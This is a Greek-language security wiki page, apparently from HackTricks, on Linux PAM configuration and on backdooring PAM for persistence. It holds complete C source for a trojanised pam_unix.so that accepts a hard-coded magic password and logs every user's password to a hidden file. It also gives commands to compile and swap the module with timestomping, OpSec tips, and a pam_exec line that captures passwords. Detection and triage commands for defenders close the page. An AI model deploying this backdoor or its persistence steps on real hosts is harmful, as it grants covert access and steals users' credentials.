# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Βασικές πληροφορίες

**Το PAM (Pluggable Authentication Modules)** λειτουργεί ως μηχανισμός ασφαλείας που **επαληθεύει την ταυτότητα των χρηστών που επιχειρούν να αποκτήσουν πρόσβαση σε υπηρεσίες υπολογιστή**, ελέγχοντας την πρόσβασή τους βάσει διάφορων κριτηρίων. Μοιάζει με ψηφιακό θυρωρό, διασφαλίζοντας ότι μόνο εξουσιοδοτημένοι χρήστες μπορούν να χρησιμοποιούν συγκεκριμένες υπηρεσίες, ενώ ενδέχεται να περιορίζει τη χρήση τους για την αποφυγή υπερφόρτωσης του συστήματος.

#### Αρχεία διαμόρφωσης

- Το **Solaris** υποστηρίζει το παλαιότερο κεντρικό αρχείο `/etc/pam.conf`, όμως οι τρέχουσες οδηγίες προτιμούν αρχεία υπηρεσιών στον κατάλογο `/etc/pam.d`.<sup>[[10]](#references)</sup>
- Τα **Linux systems** προτιμούν την προσέγγιση καταλόγου, αποθηκεύοντας διαμορφώσεις ειδικές για κάθε υπηρεσία μέσα στο `/etc/pam.d`. Για παράδειγμα, το αρχείο διαμόρφωσης για την υπηρεσία login βρίσκεται στο `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Ένα παράδειγμα διαμόρφωσης του PAM για την υπηρεσία login θα μπορούσε να μοιάζει ως εξής:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Περιοχές διαχείρισης PAM**

Αυτές οι περιοχές, ή ομάδες διαχείρισης, περιλαμβάνουν τις **auth**, **account**, **password** και **session**, καθεμία υπεύθυνη για διαφορετικές πτυχές της διαδικασίας authentication και διαχείρισης session:<sup>[[1]](#references)</sup>

- **Auth**: Επικυρώνει την ταυτότητα του χρήστη, συνήθως ζητώντας έναν κωδικό πρόσβασης.
- **Account**: Διαχειρίζεται την επαλήθευση του λογαριασμού, ελέγχοντας συνθήκες όπως τη συμμετοχή σε ομάδες ή περιορισμούς βάσει ώρας.
- **Password**: Διαχειρίζεται τις ενημερώσεις κωδικών πρόσβασης, συμπεριλαμβανομένων των ελέγχων πολυπλοκότητας ή της πρόληψης dictionary attacks.
- **Session**: Διαχειρίζεται ενέργειες κατά την έναρξη ή τη λήξη ενός service session, όπως το mounting directories ή ο καθορισμός ορίων πόρων.

#### **Έλεγχοι modules PAM**

Οι έλεγχοι καθορίζουν την απόκριση του module σε επιτυχία ή αποτυχία, επηρεάζοντας τη συνολική διαδικασία authentication. Περιλαμβάνουν:<sup>[[1]](#references)</sup>

- **Required**: Η αποτυχία ενός required module οδηγεί τελικά σε αποτυχία, αλλά μόνο αφού ελεγχθούν όλα τα επόμενα modules.
- **Requisite**: Άμεσος τερματισμός της διαδικασίας σε περίπτωση αποτυχίας.
- **Sufficient**: Αν κανένα προηγούμενο `required` module δεν απέτυχε, η επιτυχία επιστρέφεται αμέσως και παραλείπονται τα υπόλοιπα modules της ίδιας ομάδας διαχείρισης.
- **Optional**: Προκαλεί αποτυχία μόνο αν είναι το μοναδικό module στο stack.

#### Επιθετικά σημασιολογικά στοιχεία που έχουν σημασία

Κατά την ανάλυση ή τροποποίηση του PAM, η **θέση ενός εισαγόμενου κανόνα** καθορίζει ποιο stack τον βλέπει:<sup>[[1]](#references)[[13]](#references)</sup>

- Τα `include` και `substack` εισάγουν κανόνες από άλλα αρχεία, επομένως η επεξεργασία του `sshd` μπορεί να επηρεάσει μόνο το SSH, ενώ η επεξεργασία των `system-auth`, `common-auth` ή ενός άλλου shared stack επηρεάζει πολλές υπηρεσίες ταυτόχρονα.<sup>[[1]](#references)[[13]](#references)</sup>
- Το PAM υποστηρίζει επίσης controls σε αγκύλες, όπως `[success=1 default=ignore]`. Αυτά μπορούν να χρησιμοποιηθούν καταχρηστικά για την **παράλειψη ενός ή περισσότερων modules** μετά από έναν επιτυχή custom έλεγχο, αντί για εμφανή αντικατάσταση του `pam_unix.so`.<sup>[[1]](#references)</sup>
- Το `module-path` μπορεί να είναι **absolute** (`/usr/lib/security/pam_custom.so`) ή **relative** προς τον προεπιλεγμένο κατάλογο modules του PAM. Σε σύγχρονα Linux συστήματα, οι πραγματικοί κατάλογοι είναι συχνά οι `/lib/security`, `/lib64/security`, `/usr/lib/security` ή multiarch paths όπως το `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Γρήγορο operator takeaway: χαρτογραφείτε πάντα το **πλήρες service graph** πριν από οποιοδήποτε patching. Για παράδειγμα, τα `sshd -> password-auth -> system-auth` σε ορισμένα distros ή `sshd -> system-remote-login -> system-login -> system-auth` σε άλλα σημαίνουν ότι το ίδιο one-line implant μπορεί να εξαπλωθεί πολύ ευρύτερα από τον προβλεπόμενο σκοπό του.<sup>[[1]](#references)[[13]](#references)</sup>

#### Παράδειγμα σεναρίου

Σε μια εγκατάσταση με πολλά auth modules, η διαδικασία ακολουθεί αυστηρή σειρά. Αν το module `pam_securetty` εντοπίσει ότι το login terminal δεν είναι εξουσιοδοτημένο, τα root logins αποκλείονται, ωστόσο όλα τα modules εξακολουθούν να υποβάλλονται σε επεξεργασία λόγω της κατάστασής του ως "required". Το `pam_env` ορίζει μεταβλητές περιβάλλοντος, κάτι που μπορεί να βελτιώσει την εμπειρία του χρήστη. Τα modules `pam_ldap` και `pam_unix` συνεργάζονται για το authentication του χρήστη, με το `pam_unix` να προσπαθεί να χρησιμοποιήσει έναν κωδικό πρόσβασης που έχει δοθεί προηγουμένως, βελτιώνοντας την αποδοτικότητα και την ευελιξία των μεθόδων authentication.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## Backdooring PAM – Hooking `pam_unix.so`

Ένα κλασικό persistence trick σε Linux environments υψηλής αξίας είναι η **αντικατάσταση της νόμιμης PAM library με ένα trojanised drop-in**. Σε έναν host του οποίου το PAM stack φορτώνει το `pam_unix.so`, το SSH ή το console authentication μπορεί να καλέσει το entry point `pam_sm_authenticate()`· μια κακόβουλη αντικατάσταση μπορεί να καταγράψει credentials ή να υλοποιήσει ένα *magic* password bypass.<sup>[[2]](#references)[[11]](#references)</sup>

### Cheatsheet μεταγλώττισης
Το παρακάτω sketch χρησιμοποιεί το service entry point `pam_sm_authenticate()` του Linux-PAM και το `pam_get_authtok()` για πρόσβαση στο authentication token.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Δείγμα trojan του `pam_unix.so`</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
if (real_module) return 0;
real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
if (!real_module) return -1;
orig_auth = dlsym(real_module, "pam_sm_authenticate");
orig_setcred = dlsym(real_module, "pam_sm_setcred");
return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user = NULL, *pass = NULL;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
if (user && pass) {
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
if (fd >= 0) {
dprintf(fd, "%s:%s\n", user, pass);
close(fd);
}
}

/* Forward to the renamed original module. */
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
if (load_original() != 0) return PAM_SYSTEM_ERR;
return orig_setcred(pamh, flags, argc, argv);
}
```
</details>

Κάντε compile και πραγματοποιήστε stealth αντικατάσταση (το μοτίβο αντικατάστασης/timestomp τεκμηριώνεται από την Unit 42). Προσαρμόστε τόσο το hard-coded path του backup στο wrapper όσο και τις παρακάτω εντολές στον πραγματικό κατάλογο των PAM modules του target:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec Συμβουλές
1. **Atomic overwrite** – γράψτε μια πλήρη library σε ένα προσωρινό αρχείο και μετονομάστε την ώστε να αντικαταστήσει το υπάρχον αρχείο, για να μην παραμείνει ένα μερικώς γραμμένο authentication module.
2. Μια διαδρομή όπως `/usr/bin/.dbus.log` παρατηρήθηκε στην ανάλυση AuthDoor της Unit 42, επομένως αποτελεί επίσης χρήσιμο hunting indicator.<sup>[[2]](#references)</sup>
3. Διατηρήστε τα entry points που αναμένει το PAM stack (για παράδειγμα, `pam_sm_authenticate` και `pam_sm_setcred`), ώστε οι υπόλοιπες λειτουργίες διαχείρισης να συνεχίσουν να λειτουργούν.<sup>[[11]](#references)[[18]](#references)</sup>

### Ανίχνευση
Για ελέγχους ακεραιότητας πακέτων, το RPM επαληθεύει τα metadata των εγκατεστημένων αρχείων, το `debsums -s` αναφέρει σφάλματα checksum και το `dpkg -S` στο triage block αναζητά την ιδιοκτησία πακέτων· η σύνταξη audit watch καταγράφει εγγραφές και αλλαγές attributes σε μια διαδρομή.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Συγκρίνετε τα MD5/SHA256 του `pam_unix.so` με το αντίστοιχο distro package.
* Χρησιμοποιήστε `rpm -V pam` ή `debsums -s libpam-modules` για να εντοπίσετε replaced libraries χωρίς manual hashing.
* Ελέγξτε για world-writable ή ασυνήθιστη ιδιοκτησία κάτω από το `/lib/security/`.
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Κάντε Grep στα PAM configs για μη αναμενόμενα modules: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Γρήγορες triage εντολές (μετά από compromise ή για threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Κατάχρηση του `pam_exec` για persistence
Αντί να αντικαταστήσετε το `pam_unix.so`, μια πιο ήπια προσέγγιση είναι να προσθέσετε μια γραμμή `pam_exec` στο `/etc/pam.d/sshd`, ώστε μια κλήση που φτάνει σε εκείνη τη γραμμή του PAM να εκτελεί ένα helper, διατηρώντας παράλληλα ανέπαφο το κανονικό stack.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
Το `pam_exec` λαμβάνει μεταδεδομένα PAM σε environment variables όπως `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` και `PAM_TYPE`. Με το `expose_authtok`, το helper μπορεί να διαβάσει έως και `PAM_MAX_RESP_SIZE` bytes του password από το `stdin` κατά τις φάσεις `auth` ή `password`. Αν θέλετε το helper να εκτελείται με το effective UID αντί για το real UID, προσθέστε `seteuid`.<sup>[[4]](#references)</sup>

Ακολουθούν πρακτικές σημειώσεις σχετικά με τους τύπους module και το φίλτρο `type=` που τεκμηριώνονται για το `pam_exec`:<sup>[[4]](#references)</sup>

- Το `session optional pam_exec.so ...` είναι καταλληλότερο για **post-login actions**, όπως το εκ νέου άνοιγμα sockets ή η εκκίνηση ενός detached daemon.
- Το `auth optional pam_exec.so quiet expose_authtok ...` είναι η συνήθης επιλογή για **credential capture**, επειδή εκτελείται πριν ανοίξει το session.
- Τα `type=session` ή `type=auth` μπορούν να χρησιμοποιηθούν για τον περιορισμό της εκτέλεσης σε συγκεκριμένη PAM phase και την αποφυγή θορυβώδους διπλής εκτέλεσης.

### Εργαλεία distro που επιβιώνουν: `authselect`

Σε συστήματα RHEL και οικογένειας Fedora που χρησιμοποιούν `authselect`, οι άμεσες αλλαγές σε generated files, όπως τα `/etc/pam.d/system-auth` ή `/etc/pam.d/password-auth`, ενδέχεται να **αντικατασταθούν από το `authselect`**. Για persistence, οι operators συχνά τροποποιούν το ενεργό custom profile στο `/etc/authselect/custom/<profile>/` και στη συνέχεια το επιλέγουν ξανά.<sup>[[5]](#references)[[19]](#references)</sup>

Τυπικό workflow όταν έχετε root:<sup>[[5]](#references)</sup>
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```
Αυτό έχει σημασία τόσο για το offense όσο και για το triage: αν το `/etc/pam.d/system-auth` περιέχει το banner `Generated by authselect` και `Do not modify this file manually`, τότε το πραγματικό σημείο persistence μπορεί να βρίσκεται στο `/etc/authselect/custom/` αντί για το `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Πρόσφατο tradecraft που έχει παρατηρηθεί στην πράξη

Πρόσφατες αναφορές του 2025 σχετικά με το **Plague** Linux backdoor έδειξαν την ίδια βασική ιδέα σε πιο εξελιγμένη μορφή: ένα κακόβουλο PAM component με **static bypass password**, καθώς και εκκαθάριση μεταβλητών περιβάλλοντος που σχετίζονται με το SSH και του shell history (`HISTFILE=/dev/null`), ώστε να μειώνονται τα ίχνη του session μετά το login.<sup>[[3]](#references)</sup> Αυτό αποτελεί χρήσιμο hunting pattern, επειδή η λογική του backdoor μπορεί να βρίσκεται στο PAM, ενώ τα artifacts stealth εμφανίζονται μόνο **after** την επιτυχή authentication.


## References

- [1] [pam.conf(5) / pam.d(5) - Εγχειρίδιο Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Το Playbook του Covert Operator: Διείσδυση σε παγκόσμια δίκτυα τηλεπικοινωνιών - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Ένα πρόσφατα ανακαλυφθέν PAM-Based Backdoor για Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Εγχειρίδιο Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Διαμόρφωση user authentication με χρήση του authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Εγχειρίδιο Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Διαχείριση Authentication στο Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Εγχειρίδιο Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Εγχειρίδιο Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Οδηγός Authentication σε επίπεδο System - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Λίστα αρχείων πακέτου Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Εγχειρίδιο Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Εγχειρίδιο Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Εγχειρίδιο Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Changes/Make Authselect Mandatory - Wiki του Fedora Project](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
